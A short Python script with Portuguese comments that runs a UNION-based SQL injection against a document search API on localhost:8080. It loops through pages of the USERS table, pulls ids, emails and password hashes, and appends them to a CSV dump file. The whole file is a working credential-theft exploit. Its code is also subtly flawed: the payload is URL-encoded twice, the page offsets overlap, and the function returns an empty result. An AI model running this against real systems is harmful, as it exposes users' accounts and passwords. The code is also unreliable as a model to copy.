import urllib.parse
import requests

def build_sql_string(n):
  """
  Construi a string SQL para a busca de hashes de passwords.

  Args:
    n: Número da página de consulta (0-5000).

  Returns:
    Uma string SQL formatada para a busca de hashes de passwords.
  """
  sql_string = "1' UNION SELECT id, email, password FROM USERS OFFSET {n} LIMIT 100--".format(n=n)
  return urllib.parse.quote(sql_string)

def execute_api_search(sql_string):
  """
  Executa a busca de hashes de passwords pela API.

  Args:
    sql_string: String SQL formatada para a busca de hashes de passwords.

  Returns:
    O JSON resultante da busca de hashes de passwords.
  """
  query = f'?query={urllib.parse.quote(sql_string)}'
  response = requests.get('http://localhost:8080/api/documents/search'+query)
  return response.json()

def recover_hashes():
  """
  Recovers hashes de passwords da base de dados H2.

  Returns:
    Um dicionário com os hashes de passwords recuperados.
  """

  n = 0
  while n <= 5000: # Loop até o limite de páginas
    sql_string = build_sql_string(n)
    response = execute_api_search(sql_string)
    with open('recovery_dump.csv', 'a') as file:
      file.write(response['result'])

    n += 1

  return {} # Retorna um dicionário vazio, pois o loop não retorna nenhum resultado
